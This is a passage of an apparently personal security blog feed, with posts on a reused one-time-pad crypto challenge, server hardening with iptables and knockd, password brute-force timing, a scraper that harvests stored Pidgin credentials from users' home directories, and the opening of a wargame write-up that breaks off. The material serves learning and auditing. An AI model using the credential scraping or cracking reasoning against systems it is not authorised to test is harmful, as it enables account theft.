            &lt;span style=&#34;color: #f8f8f2&#34;&gt;s1&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;encoder&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;encodeBuffer&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;plaintxt&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color: #f92672&#34;&gt;}&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;catch&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;Exception&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;exception&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt;
        &lt;span style=&#34;color: #f92672&#34;&gt;{&lt;/span&gt;
            &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
        &lt;span style=&#34;color: #f92672&#34;&gt;}&lt;/span&gt;

        &lt;span style=&#34;color: #f8f8f2&#34;&gt;System&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;out&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;println&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;s&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;System&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;out&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;println&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;s1&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color: #66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;s1&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color: #f92672&#34;&gt;}&lt;/span&gt;

    &lt;span style=&#34;color: #66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color: #66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;String&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;[]&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;args&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt;  &lt;span style=&#34;color: #66d9ef&#34;&gt;throws&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;Exception&lt;/span&gt;
    &lt;span style=&#34;color: #f92672&#34;&gt;{&lt;/span&gt;
        &lt;span style=&#34;color: #f8f8f2&#34;&gt;hardwork&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color: #f8f8f2&#34;&gt;args&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;]);&lt;/span&gt;
    &lt;span style=&#34;color: #f92672&#34;&gt;}&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;h1 id=&#34;challenge-27:00aa8d5840836b6803fb0a2203b66750&#34;&gt;Challenge 27&lt;/h1&gt;

&lt;p&gt;One time pad with a reused pad. Another challenge that taught me a lot, specifically
cribdragging. Having found &lt;a href=&#34;https://github.com/SpiderLabs/cribdrag&#34;&gt;this tool&lt;/a&gt; I started
to figure out how to use this.&lt;/p&gt;

&lt;p&gt;Basically you need to take two of the encrypted texts, use the &lt;code&gt;xorstrings&lt;/code&gt; to
xor them together and then pass that to the &lt;code&gt;cribdrag&lt;/code&gt; tool. Then you need to start
entering words that might be in the text. If a word like &lt;code&gt;the&lt;/code&gt;, or &lt;code&gt;and&lt;/code&gt;, are in the
text, you should see some plaintext appear in the output. Then perhaps pad the word
with spaces either side. Once you have more of the plaintext, you can use that to
expand the strings in either text.&lt;/p&gt;

&lt;p&gt;Eventually you will get the plain text for either string. Using that you can then
decipher the other texts.&lt;/p&gt;

&lt;p&gt;The strings increase in length, so combine them all until you have the final
sentence.&lt;/p&gt;

&lt;p&gt;Here&amp;rsquo;s a quick example for a couple of the lines:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://asciinema.org/a/65rhh2rqofe51f0yst1nktmbu&#34;&gt;&lt;img src=&#34;https://asciinema.org/a/65rhh2rqofe51f0yst1nktmbu.png&#34; alt=&#34;asciicast&#34; /&gt;&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Burnmail: temporary mail forwarding</title>
      <link>https://svenito.github.io/nowhere/2015/05/29/burnmail-temporary-mail-forwarding/</link>
      <pubDate>Fri, 29 May 2015 00:00:00 +0000</pubDate>
      
      <guid>https://svenito.github.io/nowhere/2015/05/29/burnmail-temporary-mail-forwarding/</guid>
      <description>

&lt;p&gt;A while back I got curious about how easy it would be to setup a temporary
email forwarding service, akin to &lt;a href=&#34;https://meltmail.com/&#34;&gt;Meltmail&lt;/a&gt;. So I got
to it and made it.&lt;/p&gt;

&lt;p&gt;In essence you will create a temporary email address that will forward all
mail it receives to your inbox. Once it expires, it drops all incoming mail.&lt;/p&gt;

&lt;p&gt;It&amp;rsquo;s pretty much ready now, hence why I am posting about it.&lt;/p&gt;

&lt;p&gt;The differences between Burnmail (yeah, best I could do for now) and other
services is:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;forwarding can be expired by time or by number of received mails&lt;/li&gt;
&lt;li&gt;all tasks are accomplished through email. There&amp;rsquo;s no web interface&lt;/li&gt;
&lt;li&gt;forwarding address is based on your original address with a short, random
string appended, to make it easy to remember.&lt;/li&gt;
&lt;li&gt;addreses are also easy to type on a mobile device,
as the extra string consists of digits and lowercase chars only.&lt;/li&gt;
&lt;li&gt;commands are forgiving and short&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The plan is to clean up the code and then release that on Github, but in the
meantime feel free to make use of it.&lt;/p&gt;

&lt;p&gt;Here&amp;rsquo;s how to use it:&lt;/p&gt;

&lt;h2 id=&#34;creating-a-new-burnmail-address:e52eba2da256b91bcb5838bbad42c991&#34;&gt;Creating a new Burnmail address&lt;/h2&gt;

&lt;p&gt;To create a new Burnmail address, send an email to &lt;a href=&#34;mailto:burn@kthnxbai.co.uk&#34;&gt;burn@kthnxbai.co.uk&lt;/a&gt;,
from the address that you want your Burnmail forwarded to. In the subject
you need to specify the expiration term. The following commands are valid:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;* time [n] - n is 3, 6, 12, 24, or 48 hours. It will automatically
  select the closest value to the one you specify.
* uses [n] - n is between 1 and 30. It will be automatically capped to 30.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;By using the &lt;code&gt;time&lt;/code&gt; command you will create an address that expires after &lt;code&gt;n&lt;/code&gt;
hours. The &lt;code&gt;uses&lt;/code&gt; command creates an address that expires after &lt;code&gt;n&lt;/code&gt; emails have
been received through that address.&lt;/p&gt;

&lt;p&gt;Once your forwarder has been set up, you will receive a confirmation email with
your Burnmaill address. Check your spam folder just in case.&lt;/p&gt;

&lt;h2 id=&#34;getting-a-list-of-emails:e52eba2da256b91bcb5838bbad42c991&#34;&gt;Getting a list of emails&lt;/h2&gt;

&lt;p&gt;To get a list of your current Burnmail addresses for an email address,
send an email to &lt;a href=&#34;mailto:burn@kthnxbai.co.uk&#34;&gt;burn@kthnxbai.co.uk&lt;/a&gt; with the subject &lt;code&gt;stat&lt;/code&gt;.
An email listing all your current forwarders for that address and their
expiration terms will be sent to you.&lt;/p&gt;

&lt;h2 id=&#34;deleting-burnmail:e52eba2da256b91bcb5838bbad42c991&#34;&gt;Deleting Burnmail&lt;/h2&gt;

&lt;p&gt;To delete a Burnmail send an email to &lt;a href=&#34;mailto:burn@kthnxbai.co.uk&#34;&gt;burn@kthnxbai.co.uk&lt;/a&gt; with the subject
&lt;code&gt;kill address&lt;/code&gt;, where &lt;code&gt;address&lt;/code&gt; is the burnmail address to kill.&lt;/p&gt;

&lt;h2 id=&#34;thoughts:e52eba2da256b91bcb5838bbad42c991&#34;&gt;Thoughts?&lt;/h2&gt;

&lt;p&gt;That&amp;rsquo;s it for now. Make sure to check your spam folder if you aren&amp;rsquo;t
receiving any mail.&lt;/p&gt;

&lt;p&gt;If you have any suggestions for features, or notice something broken,
please let me know.&lt;/p&gt;

&lt;p&gt;Also bear in mind that it&amp;rsquo;s early days so there might be bugs.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>I made this: Purplescraper</title>
      <link>https://svenito.github.io/nowhere/2015/05/14/i-made-this-purplescraper/</link>
      <pubDate>Thu, 14 May 2015 00:00:00 +0000</pubDate>
      
      <guid>https://svenito.github.io/nowhere/2015/05/14/i-made-this-purplescraper/</guid>
      <description>&lt;p&gt;Had this script sitting around for a while and I figured I would clean it up
a bit and share it.&lt;/p&gt;

&lt;p&gt;Get &lt;a href=&#34;https://github.com/Svenito/purplescraper&#34;&gt;Purplescraper from my Github&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;In short: you give it a starting directory, which will usually be where all the user
directories are, and it will go get all &lt;code&gt;.purple/accounts.xml&lt;/code&gt; files and extract
any usernames and passwords it finds into a new file.&lt;/p&gt;

&lt;p&gt;Useful to make sure none of your sensitive data is available to other, non
authorised users via slack file permissions.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>The joys of server ownership</title>
      <link>https://svenito.github.io/nowhere/2015/05/08/the-joys-of-server-ownership/</link>
      <pubDate>Fri, 08 May 2015 00:00:00 +0000</pubDate>
      
      <guid>https://svenito.github.io/nowhere/2015/05/08/the-joys-of-server-ownership/</guid>
      <description>

&lt;p&gt;This post serves mostly as a &amp;ldquo;note to self&amp;rdquo;.&lt;/p&gt;

&lt;p&gt;I just ordered myself a super cheap VPS from &lt;a href=&#34;http://ramnode.com&#34;&gt;Ramnode&lt;/a&gt; as I have
a little project I would like to setup and see if I can make it work.&lt;/p&gt;

&lt;p&gt;But first I had to setup the server (Debian 7.0) and it&amp;rsquo;s been a while since I&amp;rsquo;ve done that, so
some reading was in order to remind myself of all the joys. Thus I decided to note this
down for myself and anyone else who&amp;rsquo;s interested. So it&amp;rsquo;s not an in depth explanation
by any means.&lt;/p&gt;

&lt;h2 id=&#34;securing:5917a0b95cbd7d2b1be5f00f2236d291&#34;&gt;Securing&lt;/h2&gt;

&lt;p&gt;I&amp;rsquo;m not looking for bullet proof as this won&amp;rsquo;t be a production server and won&amp;rsquo;t
hold any sensitive info, but I&amp;rsquo;d like to know that it&amp;rsquo;s at least somewhat locked
down.&lt;/p&gt;

&lt;p&gt;So first off install &lt;a href=&#34;http://www.fail2ban.org/wiki/index.php/Main_Page&#34;&gt;Fail2ban&lt;/a&gt;. This
will lock out users who fail to authenticate too often. Ramnode actually have a
&lt;a href=&#34;https://www.youtube.com/watch?v=GmVoqFv_lGU&#34;&gt;good video on this&lt;/a&gt;. As we&amp;rsquo;ll
only allow key based authentication it&amp;rsquo;s a bit redundant, but if you want to
go that way, there&amp;rsquo;s the info.&lt;/p&gt;

&lt;p&gt;Then turn off password authentication for SSH as I&amp;rsquo;ll be using only keys to
authenticate. Edit &lt;code&gt;/etc/ssh/sshd_conf&lt;/code&gt; and change the following lines to read:&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;ChallengeResponseAuthentication no
PasswordAuthentication no
UsePAM no
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Make sure you have uploaded your &lt;a href=&#34;https://help.ubuntu.com/community/SSH/OpenSSH/Keys&#34;&gt;public key&lt;/a&gt; to
&lt;code&gt;~/.ssh/authorized_keys&lt;/code&gt; and set the permissions on &lt;code&gt;.ssh&lt;/code&gt; and &lt;code&gt;authorized_keys&lt;/code&gt; on the
server to &lt;code&gt;700&lt;/code&gt; and &lt;code&gt;600&lt;/code&gt; respectively.&lt;/p&gt;

&lt;p&gt;I also changed the default SSH port to something else, as that already keeps the number of automated
bruteforcers down. Do this by changing the following line in &lt;code&gt;/etc/ssh/sshd_config&lt;/code&gt;&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;Port 22
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Set it to anything that doesn&amp;rsquo;t clash with other services. i.e. not 25 or 80 for example.&lt;/p&gt;

&lt;p&gt;Once configured &lt;code&gt;sudo service sshd reload&lt;/code&gt; to pick up the changes.&lt;/p&gt;

&lt;p&gt;So next up &lt;code&gt;iptables&lt;/code&gt;. I followed &lt;a href=&#34;https://www.digitalocean.com/community/tutorials/how-to-set-up-a-firewall-using-ip-tables-on-ubuntu-12-04&#34;&gt;this guide&lt;/a&gt;
which gives you a good start. Be sure to run &lt;code&gt;sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT&lt;/code&gt; first.
Otherwise you&amp;rsquo;ll end up blocking your current connection and&amp;hellip; yeah, ok, I made that mistake.&lt;/p&gt;

&lt;p&gt;Then allow what you need and default to dropping the rest. It&amp;rsquo;s all in the URL above, but to re-iterate:&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;# Accept connections on port 22
iptables -A INPUT -p tcp --syn --destination-port 22 -j ACCEPT

# Deny all other input
iptables -A INPUT -p tcp -syn -j DROP
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;You will need to run the first line for each port that needs to be able to accept
incoming connections.&lt;/p&gt;

&lt;p&gt;I additionally set up &lt;a href=&#34;http://www.zeroflux.org/projects/knock&#34;&gt;knockd&lt;/a&gt; just to play around with it.&lt;/p&gt;

&lt;p&gt;To do this edit &lt;code&gt;/etc/knockd.conf&lt;/code&gt; and set the port sequences. It should have a default
set for enabling and disabling the ssh port. Edit this to reflect any port changes. If you want to run miltiple commands
for a knock, simply concatenate the command with &lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;. You can even make one command open
a port for a given time. As we have our *keep established connections&amp;rdquo; rule in &lt;code&gt;iptables&lt;/code&gt; we
can do&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;[opencloseSSH]
        sequence      = 2222:udp,3333:tcp,4444:udp
        seq_timeout   = 15
        tcpflags      = syn,ack
        start_command = /usr/sbin/iptables -A INPUT -s %IP% -p tcp --syn --dport 22 -j ACCEPT
        cmd_timeout   = 10
        stop_command  = /usr/sbin/iptables -D INPUT -s %IP% -p tcp --syn --dport 22 -j ACCEPT
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Lifted from the docs. This will allow and block only the IP from where the knock originated.&lt;/p&gt;

&lt;p&gt;That&amp;rsquo;s all for now. Postfix next time&amp;hellip;.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>How&#39;s that Pizza coming along?</title>
      <link>https://svenito.github.io/nowhere/2015/04/15/hows-that-pizza-coming-along/</link>
      <pubDate>Wed, 15 Apr 2015 00:00:00 +0000</pubDate>
      
      <guid>https://svenito.github.io/nowhere/2015/04/15/hows-that-pizza-coming-along/</guid>
      <description>

&lt;p&gt;&lt;strong&gt;UPDATE&lt;/strong&gt;: Published what I have done so far &lt;a href=&#34;https://github.com/Svenito/dominos&#34;&gt;on my Github&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Having been a bit busy with other things recently, I&amp;rsquo;ve not mentioned the Domino&amp;rsquo;s
thing for a while. So in case anyone is wondering where I am with this:&lt;/p&gt;

&lt;script type=&#34;text/javascript&#34; src=&#34;https://asciinema.org/a/17706.js&#34; id=&#34;asciicast-17706&#34; async&gt;&lt;/script&gt;

&lt;p&gt;Basically I&amp;rsquo;ve reworked how the store finder works. I&amp;rsquo;ve collapsed the whole store finding and
delivery postcode stuff into one &lt;code&gt;locate_store&lt;/code&gt; call.
Enter your postcode and it&amp;rsquo;ll get the nearest delivery capable store and select it.
Much simpler, as you can see.&lt;/p&gt;

&lt;p&gt;Now you also specify your name, phone number, and email when you select the
delivery address. The payment side of things is coming along, but is only in debug
at the moment.&lt;/p&gt;

&lt;h3 id=&#34;what-s-planned:5a759afdcb888fa1ea8f501772dd420a&#34;&gt;What&amp;rsquo;s planned&lt;/h3&gt;

&lt;p&gt;I want to actually place a &lt;em&gt;cash on delivery&lt;/em&gt; order and eat a CLI pizza. Once that&amp;rsquo;s finished,
I will clean up the project, put it on Github, and package it for &lt;em&gt;pip&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Then I&amp;rsquo;ll get to work on investigating if I can handle card payments via this tool too. Certainly
there seems to be some relevant info available. With some luck this will work on some sort of
URL callback, but I&amp;rsquo;ll find out eventually.&lt;/p&gt;

&lt;p&gt;Then it&amp;rsquo;s really about hoping that enough people like it, and want to help
by adding support for ordering in their own country.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Revisiting strong passwords</title>
      <link>https://svenito.github.io/nowhere/2015/04/14/revisiting-strong-passwords/</link>
      <pubDate>Tue, 14 Apr 2015 00:00:00 +0000</pubDate>
      
      <guid>https://svenito.github.io/nowhere/2015/04/14/revisiting-strong-passwords/</guid>
      <description>

&lt;p&gt;Some time ago I wrote a post about &lt;a href=&#34;http://unlogic.co.uk/2012/06/06/strong-passwords/&#34;&gt;strong passwords&lt;/a&gt;.
That was three years ago and I figured I might as well revist what I wrote back then.&lt;/p&gt;

&lt;p&gt;Since then technology has moved on a lot, and the number of password breaches has increased,
aswell as the number of reports mocking our poorly chosen passwords.&lt;/p&gt;

&lt;p&gt;As far as I am concerned, I am still using 15-18 random character passwords. I&amp;rsquo;m no longer
lowercase only, but a mixture of upper, lower, digit, and punctuation. The length depends
on how long I am allowed to make my passwords. Believe it or not, some sites limit you to
a maximum length of 12, possibly less on some sites. Silly huh? Not only that, but still they
tell me my 18 character password without punctuation or digits is less secure than a
4 character mixed character password. Hmph.&lt;/p&gt;

&lt;p&gt;But what is cropping up more and more, and what I wanted to write about, is the password
rules on signup pages. For example &amp;ldquo;Your password must be at least 8
characters long, contain one upper case letter, and a number.&amp;rdquo; Sometimes a &lt;em&gt;special
character&lt;/em&gt; is thrown into the mix too. The issue here is, that although your final
password is more secure (in theory), the search space for a valid password is reduced.
With some attackers being able to generate 1 trillion guesses per second, keeping the
size of the search space large will help.&lt;/p&gt;

&lt;p&gt;By how much difference does it make? Well that&amp;rsquo;s what I want to figure out.&lt;/p&gt;

&lt;p&gt;So using the commonly used english alphabet with digits and
special characters we have the following available&lt;/p&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Name&lt;/th&gt;
&lt;th&gt;Content&lt;/th&gt;
&lt;th&gt;Character Count&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;

&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;lower&lt;/td&gt;
&lt;td&gt;abcdefghijklmnopqrstuvwxyz&lt;/td&gt;
&lt;td&gt;26&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;upper&lt;/td&gt;
&lt;td&gt;ABCDEFGHIJKLMNOPQRSTUVWXYZ&lt;/td&gt;
&lt;td&gt;26&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;digits&lt;/td&gt;
&lt;td&gt;0123456789&lt;/td&gt;
&lt;td&gt;10&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;special&lt;/td&gt;
&lt;td&gt;!&amp;ldquo;#$%&amp;amp;&amp;lsquo;()*+,-./:;&amp;lt;=&amp;gt;?@[]^_{|}~`&lt;/td&gt;
&lt;td&gt;32&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Let&amp;rsquo;s assume that I have a list of password hashes from somewhere. I know
that the password is exactly 6 characters long (which I think is
a reasonably common password length these days), and I also know what rules
govern the choice of password when it is created. We&amp;rsquo;ll look at these rules in
turn and see how much difference they make. I fix the password length so I don&amp;rsquo;t
introduce too many variables.&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;ll be basing the calculations of a few assumptions:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Hashes are SHA256&lt;/li&gt;
&lt;li&gt;We have a &lt;em&gt;reasonable&lt;/em&gt; PC available (1x NVidia gtx580), managing 355 Mh/s (355,000,000 hashes/s) (&lt;a href=&#34;https://hashcat.net/oclhashcat/#performance&#34;&gt;ref&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;These are pure bruteforce attacks. No wordlists, permutation or combination attacks&lt;/li&gt;
&lt;li&gt;Timings for each attack assume &lt;em&gt;worst case&lt;/em&gt;. i.e. we have to run through all guesses.
Usually an attack stops when a valid match is found, shortening the attack.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Let&amp;rsquo;s analyse how different password creation rules affect the duration of the attack.&lt;/p&gt;

&lt;p&gt;For reference, these are the number of possible combinations for each set of
characters&lt;/p&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Possible characters&lt;/th&gt;
&lt;th&gt;Character count&lt;/th&gt;
&lt;th&gt;Number of combinations&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;

&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;lower only&lt;/td&gt;
&lt;td&gt;26&lt;/td&gt;
&lt;td&gt;308,915,776&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;upper and lower&lt;/td&gt;
&lt;td&gt;52&lt;/td&gt;
&lt;td&gt;19,770,609,664&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;upper, lower, digits&lt;/td&gt;
&lt;td&gt;62&lt;/td&gt;
&lt;td&gt;56,800,235,584&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;upper, lower, digits, special&lt;/td&gt;
&lt;td&gt;94&lt;/td&gt;
&lt;td&gt;689,869,781,056&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&#34;no-rules:419b03a80de203f007f6beb7b93557c6&#34;&gt;No rules&lt;/h2&gt;

&lt;p&gt;Using any combination of characters the number of possible passwords is &lt;em&gt;689,869,781,056&lt;/em&gt;.
It would take &lt;em&gt;1943.29 seconds&lt;/em&gt; (689,869,781,056 / 355,000,000) to crack this password.
That&amp;rsquo;s just over half an hour.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Attack time&lt;/em&gt;: 1943.29seconds&lt;/p&gt;

&lt;h2 id=&#34;at-least-one-upper-case:419b03a80de203f007f6beb7b93557c6&#34;&gt;At least one upper case&lt;/h2&gt;

&lt;p&gt;If we are forced to chose at least one upper case character, we are also saying that
there are no passwords now with just lowercase characters. The number of possible
combinations is now &lt;em&gt;689,869,781,056 - 308,915,776 = 689,560,865,280&lt;/em&gt;, or &lt;em&gt;99%&lt;/em&gt; of
the original search space. This is a small impact of only 1 second.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Attack time&lt;/em&gt;: 1942.42seconds&lt;/p&gt;

&lt;h2 id=&#34;at-least-one-upper-case-and-one-digit:419b03a80de203f007f6beb7b93557c6&#34;&gt;At least one upper case and one digit&lt;/h2&gt;

&lt;p&gt;Now we know that there are no passwords with just lowercase, or with lower and uppercase only.
Therefore we can also remove these from the list of possibilities. Our new number is now
&lt;em&gt;689,869,781,056 - 308,915,776 - 19,770,609,664 = 669,790,255,616&lt;/em&gt; or &lt;em&gt;97%&lt;/em&gt; of our search space.
Now we&amp;rsquo;re starting to see savings of up around 100seconds. In the grand scheme of things,
still not much&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Attack time&lt;/em&gt;: 1886.73seconds&lt;/p&gt;

&lt;h2 id=&#34;must-contain-all-of-the-above:419b03a80de203f007f6beb7b93557c6&#34;&gt;Must contain all of the above&lt;/h2&gt;

&lt;p&gt;Upper, lower, digits, and special all need to be present. Therefore we can remove all the
other possiblities for a grand total of:
&lt;em&gt;689,869,781,056 - 308,915,776 - 19,770,609,664 - 56,800,235,584 = 612,990,020,032&lt;/em&gt; or
&lt;em&gt;88%&lt;/em&gt; of the original. Now we&amp;rsquo;ve saved another 100 seconds.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Attack time&lt;/em&gt;: 1726.73seconds&lt;/p&gt;

&lt;h2 id=&#34;conclusion:419b03a80de203f007f6beb7b93557c6&#34;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;Although contrived, this scenario should indicate that &lt;em&gt;forcing&lt;/em&gt; people to do
things in the interest of security can help attackers too. If we are allowed
to use any character out of the full set, an attack would have taken 4 minutes more than
if we are forced to create a &lt;em&gt;secure&lt;/em&gt; password that &lt;em&gt;must&lt;/em&gt; use certain characters.
The difference isn&amp;rsquo;t much if you look above, but bear in mind that the longest attack
is &lt;em&gt;1.12&lt;/em&gt; times longer. If we extrapolate this to a 8 character password,
it&amp;rsquo;s a difference of almost 2 years (51.18 vs 49.7).&lt;/p&gt;

&lt;p&gt;Needless to say, knowing the minimum length reduces the search space once again,
because now I won&amp;rsquo;t even bother with anything below 8 characters. That&amp;rsquo;s a fairly big
chunk of possibilities.&lt;/p&gt;

&lt;p&gt;The times can be further optimised by employing wordlists, known substitutions and other
rules. The more you know about the nature of the password, the less time it takes
to crack it. Yes, applying rules and substitutions to wordlists takes time, but it&amp;rsquo;s
insignificant to the amount of time they can shave off of a brute force attack. And
the more an attacker knows about the nature and composition of your password, the
better they can tailor their wordlists.&lt;/p&gt;

&lt;p&gt;Even &lt;a href=&#34;http://www.wired.com/2015/04/snowden-sexy-margaret-thatcher-password-isnt-so-sexy/&#34;&gt;Edward Snowden&amp;rsquo;s advice isn&amp;rsquo;t bulletrpoof&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The key really is not to force people to have a specific password combination, but
to encourage good password creation. Long, random, and unpredictable, passwords
from a large vat of possibilities.&lt;/p&gt;

&lt;p&gt;Don&amp;rsquo;t tell attackers what the password isn&amp;rsquo;t. Let them guess.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Solving Narnia Part 2</title>
      <link>https://svenito.github.io/nowhere/2015/04/13/solving-narnia-part-2/</link>
      <pubDate>Mon, 13 Apr 2015 00:00:00 +0000</pubDate>
      
      <guid>https://svenito.github.io/nowhere/2015/04/13/solving-narnia-part-2/</guid>
      <description>

&lt;p&gt;Carrying on from &lt;a href=&#34;http://unlogic.co.uk/2015/04/08/solving-narnia-part1/&#34;&gt;Part 1&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&#34;level-05:100abf89ce6a11fb3cfc3f5a51e9cb94&#34;&gt;Level 05&lt;/h2&gt;

&lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;
 
